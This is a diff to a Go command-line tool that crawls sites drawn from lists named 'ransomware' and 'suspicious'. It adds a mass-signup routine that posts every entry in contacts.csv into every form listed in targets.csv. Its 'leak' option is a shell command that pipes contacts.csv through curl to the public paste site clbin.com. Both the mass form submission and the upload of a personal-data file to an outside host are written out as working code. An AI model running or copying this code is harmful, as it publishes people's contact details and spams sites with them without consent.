@@ -8,8 +8,8 @@ import (
 	"flag"
 	"fmt"
 	"io"
-	"net/url"
 	"os"
+	"os/exec"
 	"strings"
 
 	log "github.com/sirupsen/logrus"
@@ -64,10 +64,24 @@ func main() {
 		startCrawler()
 	}
 	if *signup {
-		signUpAll()
+		t, err := os.Open("targets.csv")
+		if err != nil {
+			log.Fatal("Failed to open targets.csv")
+		}
+		c, err := os.Open("contacts.csv")
+		if err != nil {
+			log.Fatal("Failed to open contacts.csv", err)
+		}
+		spider.MassSign(8, t, c)
+		fmt.Println("Signup complete") // maybe do something more interesting.
 	}
 	if *leak {
-		leakAll()
+		cmd := "cat contacts.csv | curl -F 'clbin=<-' https://clbin.com"
+		out, err := exec.Command("bash", "-c", cmd).Output()
+		if err != nil {
+			fmt.Println(err)
+		}
+		fmt.Println(string(out))
 	}
 	if *entry {
 		enter()
@@ -90,86 +104,11 @@ func startCrawler() {
 		"action",
 		"fields",
 	})
-
-	// sitelist := strings.Split(ransomware)
-	// sitelist = append(sitelist,strings.Split(suspicious))
-	// sitelist := []string{
-	// 	"https://www.madfientist.com/mr-money-mustache-interview/"}
-	sitelist := []string{"http://127.0.0.1:8000", "http://127.0.0.1:8080"}
+	sitelist := strings.Split(ransomware, "\n")
+	sitelist = append(sitelist, strings.Split(suspicious, "\n")...)
 	log.Info("START CRAWLER")
 	spider.Crawl(sitelist, w)
 	fmt.Println("Crawling complete")
-}
-
-// signUpAll reads all contacts and POSTS that contact data to every form in
-// targets.csv
-// TODO this is a lot of logic for main . . .
-func signUpAll() {
-	t, err := os.Open("targets.csv")
-	if err != nil {
-		log.Fatal("Failed to open targets.csv")
-	}
-	c, err := os.Open("contacts.csv")
-	if err != nil {
-		log.Fatal("Failed to open contacts.csv", err)
-	}
-	tReader := csv.NewReader(t)
-	cReader := csv.NewReader(c)
-	// skip first line
-	_, err = tReader.Read()
-	if err != nil {
-		log.Fatal(err)
-	}
-	_, err = cReader.Read()
-	if err != nil {
-		log.Fatal(err)
-	}
-	var contacts []spider.Contact
-	// load contacts
-	for {
-		row, err := cReader.Read()
-		if err == io.EOF {
-			break
-		}
-		if err != nil {
-			log.Error(err)
-			continue
-		}
-		c := spider.Unpack(row)
-		contacts = append(contacts, c)
-	}
-	// loop over targets
-	for {
-		target, err := tReader.Read()
-		if err == io.EOF {
-			break
-		}
-		if err != nil {
-			log.Error(err)
-			break // reader problem, so break loop
-		}
-		u, err := url.Parse(target[0])
-		if err != nil {
-			log.Error(err)
-			continue
-		}
-		f := spider.Form{
-			URL:    u,
-			Action: target[1],
-			Fields: strings.Split(target[2], "|"),
-		}
-		for _, c := range contacts {
-			err = spider.SignUp(f, c)
-			if err != nil {
-				log.Error(err)
-			}
-		}
-	}
-}
-
-// leakAll reads all contacts and posts information to CL and pastebin
-func leakAll() {
-
 }
 
 // enter handles data entry. Not very necessary, but possibly convenient.
